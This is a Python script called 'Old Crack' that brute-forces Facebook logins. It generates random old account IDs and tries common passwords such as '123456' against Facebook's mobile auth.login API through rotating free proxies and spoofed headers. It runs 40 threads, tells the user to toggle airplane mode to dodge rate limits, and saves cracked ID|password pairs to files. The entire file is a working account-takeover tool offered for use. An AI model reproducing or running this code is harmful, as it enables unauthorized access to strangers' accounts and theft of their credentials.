#Sc By Ghost
#Github: https://github.com/Ghost3987
#Tool Type : Old Crack 
#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m")
#----------------------------[DATE]-----------------------------------#
#-----------------proxies
def fetch_proxies():
    try:
        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
        proxies_data = g.json()
        proxies = proxies_data['data']
        with open('proxy.txt', 'w') as file:
            for proxy in proxies:
                proxy_ip = proxy['ip']
                proxy_port = proxy['port']
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                file.write(f"{proxy_url}\n")
        with open('proxy.txt', 'r') as file:
            saved_proxies = file.readlines()
        return saved_proxies
    except requests.exceptions.ConnectionError:
        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
    except Exception as e:
        sys.exit(e)

saved_proxies = fetch_proxies()
#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#----------------------------[LOGO]-----------------------------------#
logo = (f"""        
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  SUMON ROY
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  0.0.1
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mOld Crack\033[1;32m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mNIGERIAN USER SPEACIAL TOOLS \033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f'\033[1;31m[\033[1;37m=\033[1;31m] \033[1;37mEXAMPLE    \033[1;33m : \033[1;37m5000/10000/99999')
    lin()
    limit=input(f"\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m INPUT \033[1;31m\033[1;37m: ")
    lin()
    os.system('clear')
    print(logo)
    print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37m2010-2014 ')
    lin()
    ask=input(f"\033[1;31m[\033[1;37m?\033[1;31m] INPUT \033[1;37m:\033[1;33m ")
    lin()
    if ask in["1"]:
        newrin="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    with ThreadPool(max_workers=40) as Tx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;196m[\x1b[38;5;46m=\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m')
        print(f'\x1b[38;5;196m[\x1b[38;5;46m+\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m[\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m]\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        lin()
        for chin in user:
            uid=newrin+chin
            Tx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789"]:
            proxy_u = random.choice(saved_proxies).strip()
            proxies = {'http':f'{proxy_u}'}
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": windows(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers, proxies =proxies).json()
            if "session_key" in rp:
                print(f"\r\r\033[1;30m[\033[1;33mOK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/SUMON-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;33mOK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/SUMON-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "User must verify their account" in rp:
                print(f"\r\r\033[1;30m[\033[1;33mOK\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/SUMON-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()
#----------------------------[CODE/END]-----------------------------------#
